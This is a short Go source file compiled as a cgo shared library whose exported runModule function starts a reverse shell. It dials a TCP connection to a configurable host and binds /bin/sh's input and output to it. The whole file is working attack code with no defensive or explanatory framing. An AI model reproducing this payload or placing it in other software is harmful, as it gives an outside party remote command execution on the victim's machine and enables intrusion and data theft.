package main

import (
	"C"
	"net"
	"os/exec"
)

var Host string

func shellStart() {
	conn, err := net.Dial("tcp", Host)
	if (err != nil) {
		return
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin=conn
	cmd.Stdout=conn
	cmd.Stderr=conn
	cmd.Run()
}

//export runModule
func runModule() {
	go shellStart()
}

func main() {}
